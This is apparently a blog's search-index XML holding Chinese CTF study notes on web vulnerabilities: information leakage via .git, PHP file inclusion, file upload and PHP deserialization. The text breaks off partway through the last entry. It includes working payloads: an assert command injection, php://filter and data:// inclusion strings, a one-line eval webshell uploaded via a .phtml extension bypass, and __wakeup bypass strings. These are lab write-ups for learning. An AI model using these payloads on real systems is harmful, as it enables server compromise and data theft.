<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>信息泄露</title>
    <link href="/2025/03/22/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <url>/2025/03/22/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h1><h2 id="版本软件信息泄露"><a href="#版本软件信息泄露" class="headerlink" title="版本软件信息泄露"></a>版本软件信息泄露</h2><p>git ，svn， hg，bzr，cvs</p><h2 id="敏感文件信息泄露"><a href="#敏感文件信息泄露" class="headerlink" title="敏感文件信息泄露"></a>敏感文件信息泄露</h2><p>robots.txt <a href="http://www.zip/">www.zip</a> 静态文件配置泄露</p><h2 id="配置错误信息泄露"><a href="#配置错误信息泄露" class="headerlink" title="配置错误信息泄露"></a>配置错误信息泄露</h2><p>DS_Stroe WEB.INF Apache,Nginx 错误配置</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="http头信息泄露"><a href="#http头信息泄露" class="headerlink" title="http头信息泄露"></a>http头信息泄露</h2><p>&#x2F;admin&#x2F; 访问admin目录文件，默认index.html或index.php</p><p>&#x2F;admin 访问admin文件，若没有就返回404 访问失败</p><p>有时候不加&#x2F; 也能访问到&#x2F;admin&#x2F;，因为配置文件里面进行了设置</p><p>路由（网站主流）</p><p>&#x2F;user 访问的是user路由 ，根据server头判断，比如php，asp，jsp，aspx，html，shtml这些后缀是基于文件的</p><p>而这些看起来没有后缀的，或者类似于&#x2F;user&#x2F;login?username&#x3D;admin&amp;password&#x3D;123这种形式，基于路由的，需要多次判断</p><p>200 正常</p><p>301 302 表示跳转</p><p>404 文件不存在</p><p>500 服务器内部错误</p><p>502 转发失败 error gatwary</p><h2 id="报错信息泄露"><a href="#报错信息泄露" class="headerlink" title="报错信息泄露"></a>报错信息泄露</h2><h2 id="页面信息泄露"><a href="#页面信息泄露" class="headerlink" title="页面信息泄露"></a>页面信息泄露</h2><p>看源代码console</p><h2 id="robots-txt敏感文件泄露"><a href="#robots-txt敏感文件泄露" class="headerlink" title="robots.txt敏感文件泄露"></a>robots.txt敏感文件泄露</h2><p>机器人协议，爬虫协议</p><p>爬虫遵守的规则</p><p>不能访问（此地无银三百两）</p><p>不一定真，可能在钓鱼</p><h2 id="git文件泄露"><a href="#git文件泄露" class="headerlink" title="git文件泄露"></a>git文件泄露</h2><p>保存提交记录的文件夹文字为.git，在linux中隐藏文件</p><p>&#x2F;.git&#x2F;</p><p>403 有目录但不允许访问,则使用下面工具</p><h3 id="githack"><a href="#githack" class="headerlink" title="githack"></a>githack</h3><p>利用.git泄露利用脚本，通过泄露.git文件夹下的文件，重建还原工程源代码</p><p>渗透测试人员、攻击者，可进一步审计代码，挖掘：文件上传，sql注射等web安全漏洞</p><h3 id="利用工作原理"><a href="#利用工作原理" class="headerlink" title="利用工作原理"></a>利用工作原理</h3><p>解析.git&#x2F;index 文件，找到工程中所有的：（文件名，文件名sha1）</p><p>去.git&#x2F;objects&#x2F; 文件夹下 下载对应的文件</p><p>zlib解压文件，按原始的目录结果写入源代码</p><h3 id="利用工具的代码"><a href="#利用工具的代码" class="headerlink" title="利用工具的代码"></a>利用工具的代码</h3><h3 id="python-GitHack-py-u-“http-example-com-git-“"><a href="#python-GitHack-py-u-“http-example-com-git-“" class="headerlink" title="python .\GitHack.py -u “http://example.com/.git/“"></a>python .\GitHack.py -u “<a href="http://example.com/.git/">http://example.com/.git/</a>“</h3><h3 id="例题攻防世界-mfw"><a href="#例题攻防世界-mfw" class="headerlink" title="例题攻防世界-mfw"></a>例题攻防世界-mfw</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1739976115486-8bab1fb7-2c28-47ad-b9fa-646d32c8a0f7.png"></p><p>python GitHack.py <a href="http://61.147.171.105:53928/.git/">http://61.147.171.105:53928/.git/</a></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1739976217188-4d4a2dd7-4eb1-4f6e-91c3-9e743e9482d4.png"></p><p>templates 下面有个flag.php</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1739976274039-48dd91af-178e-41ba-9f45-87a0ff223a94.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1739976316001-3308c49c-f375-46e6-bbfa-bc5af4dfa0ff.png"></p><p>访问打不开，看index.php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$page</span> = <span class="hljs-string">&quot;home&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;templates/&quot;</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">&quot;.php&quot;</span>;<br><br><span class="hljs-comment">// I heard &#x27;..&#x27; is dangerous!</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;strpos(&#x27;<span class="hljs-subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Detected hacking attempt!&quot;</span>);<br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;file_exists(&#x27;<span class="hljs-subst">$file</span>&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出 flag 要满足以下 2 句代码，注意到第二句代码是个 assert() 断言，它可以将参数作为代码来执行。</p><p>$file &#x3D; “templates&#x2F;“ . $page . “.php”;</p><p>assert(“strpos(‘$file’, ‘..’) &#x3D;&#x3D;&#x3D; false”)</p><p>因此我们考虑让断言执行 cat 命令，直接回显目录下的 flag.php 文件，这样就能看到其中的内容了。构造出的 payload 如下，上传得到 flag。</p><p>?page&#x3D;abc’) or system(“cat templates&#x2F;flag.php”);</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1739976694836-8f670329-a5e3-4261-b168-2543fb6820eb.png"></p><h2 id="信息泄露总结"><a href="#信息泄露总结" class="headerlink" title="信息泄露总结"></a>信息泄露总结</h2><p>1.robots.txt泄露（里面有可疑路径或者文件名称）</p><p>2.git&#x2F;svn泄露(访问.git或者.svn目录出现403)</p><p>3.页面注释泄露（右键看源代码）、http头泄露</p><p>4.任意文件下载造成的信息泄露(可以下载WEB—INF文件夹里面的内容)</p><p>5.开源社区信息泄露，例如：泄露出项目名，而整个项目可以在github,gitee上找到</p><p>6.使用vim异常退出，可能存在类似.index,php,swp临时文件</p><p>还有一部分冷门的信息泄露，如.DS_Store泄露，nginx错误配置导致的文件泄露,因为利用效果有限或者不具有通用性,所以这里不深入了解</p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2025/03/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2025/03/22/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="include-文件包含"><a href="#include-文件包含" class="headerlink" title="include(文件包含)"></a>include(文件包含)</h2><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/39221607/1721100880585-75f6dc1d-34c4-45af-a828-e4f1c2905705.png?x-oss-process=image/format,webp/resize,w_1125,limit_0"><br>常见的php伪协</p><p>1）file:&#x2F;&#x2F; 访问本地文件系统</p><p>2）http:&#x2F;&#x2F; 访问HTTP(S)网址</p><p>3）ftp:&#x2F;&#x2F; 访问FTP(S)URL</p><p>4)php:&#x2F;&#x2F; 访问各个输出输入流</p><p>5)zlib:&#x2F;&#x2F; 处理压缩流</p><p>6)data:&#x2F;&#x2F; 读取数据</p><p>7)glob:&#x2F;&#x2F; 查找匹配的文件路径模式</p><p>8)phar:&#x2F;&#x2F; PHP归档</p><p>9)rar:&#x2F;&#x2F; RAR数据压缩</p><h3 id="data绕过"><a href="#data绕过" class="headerlink" title="data绕过"></a>data绕过</h3><p><a href="https://blog.csdn.net/weixin_44032232/article/details/109005766">https://blog.csdn.net/weixin_44032232&#x2F;article&#x2F;details&#x2F;109005766</a></p><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721614003694-55e9a19c-c502-47ff-8a62-29c4556f802d.png"></p><p>传入file得到源码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721614035740-73bca392-06a6-4880-afbb-9b7848b41bca.png"></p><p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721614715488-8c96e2ae-e645-4c68-9c36-8090d590dafc.png"></p><p>然后base64解密即可</p><h3 id="例题2-PseudoProtocol"><a href="#例题2-PseudoProtocol" class="headerlink" title="例题2 PseudoProtocol"></a>例题2 PseudoProtocol</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721806903064-ec6da759-45a6-4df1-aafe-33bf04c35ffd.png"></p><p>传入文件</p><p>?xxx&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;hint.php</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721806949445-533316c7-c041-4d6e-bccc-0a60627a5057.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721806968182-42cbbaa4-cb83-49c4-b132-71eab1be5f99.png"></p><p>根据提示去访问php</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721807052719-741c75c6-7b58-4fbc-8441-f5c9e77a1186.png"></p><p>试试data绕过 data:&#x2F;&#x2F;text&#x2F;plain</p><p><a href="http://node4.anna.nssctf.cn:28143/test2222222222222.php?a=data://text/plain,I">http://node4.anna.nssctf.cn:28143/test2222222222222.php?a=data://text/plain,I</a> want flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721807398088-970fe48f-e8b0-42c5-8dae-ee52ccd8fb0c.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一马</title>
    <link href="/2025/03/22/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    <url>/2025/03/22/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/articles/web/304700.html">ctfhub_web_文件上传_全通关教程(持续更新中) - FreeBuf网络安全行业门户</a></p><h1 id="文件上传（文件头绕过）"><a href="#文件上传（文件头绕过）" class="headerlink" title="文件上传（文件头绕过）"></a>文件上传（文件头绕过）</h1><h2 id="例题1-easyupload2-0"><a href="#例题1-easyupload2-0" class="headerlink" title="例题1 easyupload2.0"></a>例题1 easyupload2.0</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><?php @eval($_POST['cmd']); ?><?php?><p>是php的固定规范写法</p><p>@表示后面如果执行错误不会报错</p><p>eval()函数表示括号里的语句字符串为执行代码</p><p>&amp;_POST[‘cmd’]表示从页面中以post方式接受变量cmd</p><p>cmd是蚁剑的连接密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721807842465-37849409-7fb7-457c-8086-72927010ec98.png"></p><p>先写一个1.txt 一句话木马</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721808092455-515eb787-0758-44ec-9013-30cf4c06e3bb.png"></p><p>然后改成1.png，因为只能上传照片格式，</p><p>然后用burp抓包截取，将jpg改成php</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721808648617-db61a13a-5fd8-484a-b5e9-932d510f0534.png"></p><p>发现他过滤了php</p><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt; ?php<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">echo</span><br><span class="hljs-string">&quot;</span><br><span class="hljs-string">&lt; meta</span><br><span class="hljs-string">charset =\&quot;utf-8\&quot;&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">time</span>().(<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">100</span>, <span class="hljs-number">1000</span>));<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$target_path</span> = <span class="hljs-string">&quot;./upload&quot;</span>;<br><span class="hljs-variable">$t_path</span> = <span class="hljs-variable">$target_path</span>.<br><span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$uploaded_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>) + <span class="hljs-number">1</span>);<br><span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];<br><span class="hljs-variable">$uploaded_tmp</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;uploaded&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|hta|ini/i&quot;</span>, <span class="hljs-variable">$uploaded_ext</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;php是不行滴&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uploaded_tmp</span>);<br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$uploaded_tmp</span>, <span class="hljs-variable">$t_path</span>);<br><span class="hljs-keyword">echo</span><br><span class="hljs-string">&quot;<span class="hljs-subst">&#123;$t_path&#125;</span> succesfully uploaded!&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;不传🐎还想要f1ag?&quot;</span>);<br>&#125;<br>? &gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721809087710-67c30159-f7dc-439b-8aad-eb2f51f94c96.png"></p><h5 id="php3，php5，pht，phtml，phps都是php可运行的文件扩展名"><a href="#php3，php5，pht，phtml，phps都是php可运行的文件扩展名" class="headerlink" title="php3，php5，pht，phtml，phps都是php可运行的文件扩展名"></a>php3，php5，pht，phtml，phps都是php可运行的文件扩展名</h5><p>于是修改文件扩展名为.phtml成功上传</p><p>注意这里改完放包之后要禁用拦截，否则网页还会一直加载</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721809211222-2a4e225f-f21b-4b06-a858-50c2f02087cb.png"></p><p>接下来用中国蚁剑连接</p><p>密码就是POST传入的数据</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721810533079-5e7ebad5-ce60-462a-8d0a-1a2e16508384.png"></p><p>添加数据后，在3w里面找到flag.php</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721810569309-ad71d8e5-89a2-4c85-8040-3a185c5ae4c8.png"></p><p>NSSCTF{810efa32-9305-4a57-a665-969f34d90749}</p><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>传入</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721810688954-1ab4518e-64f2-4da4-8109-cbd3c907d285.png">这样搞的话就可以访问文件直接进phpinfo（）；</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721810759879-fc01d2a2-980c-4efe-9efb-2f55b22613a6.png"></p><p>然后访问这个网页</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721810793101-b9a78de4-2091-436b-bd04-eb0224fe1889.png"></p><p>ctrl+F 搜索网页文本</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1721810845881-7f4c76e2-921b-4e0d-ad9c-8000207917ef.png"></p><p>得到flag</p><h1 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node4.anna.nssctf.cn:28128<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>294<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node4.anna.nssctf.cn:28128<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryaJYMnfi8JLJdTfbu<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node4.anna.nssctf.cn:28128/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_648a44a949074de73151ffaa0a832aec=1740560840,1741511209; HMACCOUNT=9B0CB3FE954795E1; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1741511219; PHPSESSID=kogpi8bg9liflpkkag5ra1eor6<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryaJYMnfi8JLJdTfbu</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;uploaded&quot;; filename=&quot;1.txt&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryaJYMnfi8JLJdTfbu</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">鎰熻瑕佽绉掍簡</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryaJYMnfi8JLJdTfbu--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化</title>
    <link href="/2025/03/22/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/03/22/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h1><p><a href="https://blog.csdn.net/m0_69637056/article/details/125692222?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172206423216800178510777%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172206423216800178510777&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-125692222-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%AD%E6%B3%95&spm=1018.2226.3001.4187">PHP反序列化-CSDN博客</a></p><p><a href="https://blog.csdn.net/DARKNOTES/article/details/120714670?ops_request_misc=&request_id=&biz_id=102&utm_term=web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%AD%E6%B3%95&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-120714670.142%5Ev100%5Epc_search_result_base6&spm=1018.2226.3001.4187">[Web&#x2F;基础&#x2F;反序列化]反序列化轻量总结_web反序列化 魔术方法白名单-CSDN博客</a></p><p><a href="https://blog.csdn.net/wanderer__/article/details/127770716?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172206386816800185863496%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172206386816800185863496&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-127770716-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%AD%E6%B3%95&spm=1018.2226.3001.4187">【Web方向】 3-0 PHP反序列化基础语法知识（续更中…）_o:1:“s”:1:{s:4:“test”;s:29:“”;}代码解释-CSDN博客</a></p><p>序列化（串行化）：是将变量转换为可保存或传输的字符串的过程；</p><p>反序列化（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用；</p><p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性；</p><p>常见的php序列化和反序列化方式主要有：serialize，unserialize</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722064547616-2ab7e9ca-0a41-4e2b-b980-15e3ed229ded.png"></p><h1 id="反序列化中常见的魔术方法"><a href="#反序列化中常见的魔术方法" class="headerlink" title="反序列化中常见的魔术方法"></a>反序列化中常见的魔术方法</h1><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__construct</span>()，类的构造函数<br><span class="hljs-built_in">__destruct</span>()，类的析构函数<br><span class="hljs-built_in">__call</span>()，在对象中调用一个不可访问方法时调用<br><span class="hljs-built_in">__callStatic</span>()，用静态方式中调用一个不可访问方法时调用<br><span class="hljs-built_in">__get</span>()，获得一个类的成员变量时调用<br><span class="hljs-built_in">__set</span>()，设置一个类的成员变量时调用<br><span class="hljs-built_in">__isset</span>()，当对不可访问属性调用<span class="hljs-built_in">isset</span>()或<span class="hljs-built_in">empty</span>()时调用<br><span class="hljs-built_in">__unset</span>()，当对不可访问属性调用<span class="hljs-built_in">unset</span>()时被调用<br><span class="hljs-built_in">__sleep</span>()，执行<span class="hljs-built_in">serialize</span>()时，先会调用这个函数<br><span class="hljs-built_in">__wakeup</span>()，执行<span class="hljs-built_in">unserialize</span>()时，先会调用这个函数<br><span class="hljs-built_in">__toString</span>()，类被当成字符串时的回应方法<br><span class="hljs-built_in">__invoke</span>()，调用函数的方式调用一个对象时的回应方法<br><span class="hljs-built_in">__set_state</span>()，调用<span class="hljs-built_in">var_export</span>()导出类时，此静态方法会被调用<br><span class="hljs-built_in">__clone</span>()，当对象复制完成时调用<br><span class="hljs-built_in">__autoload</span>()，尝试加载未定义的类<br><span class="hljs-built_in">__debugInfo</span>()，打印所需调试信息<br></code></pre></td></tr></table></figure><h1 id="反序列化绕过"><a href="#反序列化绕过" class="headerlink" title="反序列化绕过"></a>反序列化绕过</h1><h2 id="protected和private绕过"><a href="#protected和private绕过" class="headerlink" title="protected和private绕过"></a>protected和private绕过</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722064766555-8c84a64e-19da-45e3-ba43-35a1e91bb2ee.png"></p><p>如果变量前是protected，则是\x00*\x00类名的形式<br>如果变量前是private，则是\x00类名\x00的形式</p><p>绕过：<br>①：php7.1+反序列化对类属性不敏感，将protected改成public<br>②：手动将序列化后的形式改为protected或者private的标准形式，结合urlencode和base64编码进行操作</p><h2 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="_wakeup绕过"></a>_wakeup绕过</h2><p>原理：<br>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup 的执行<br>示例：<br><code>O:4:&quot;Dino&quot;:**1**:&#123;s:1:&quot;a&quot;;s:4:&quot;misc&quot;;&#125;</code>改为<code>O:4:&quot;Dino&quot;:**2**:&#123;s:1:&quot;a&quot;;s:4:&quot;misc&quot;;&#125;</code></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42988179/1722064494205-ba66eed2-6cba-4dd2-89c9-d165daf994f5.png"></p><p>通过值的引用可以使$a的值与$b的值相等</p><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span 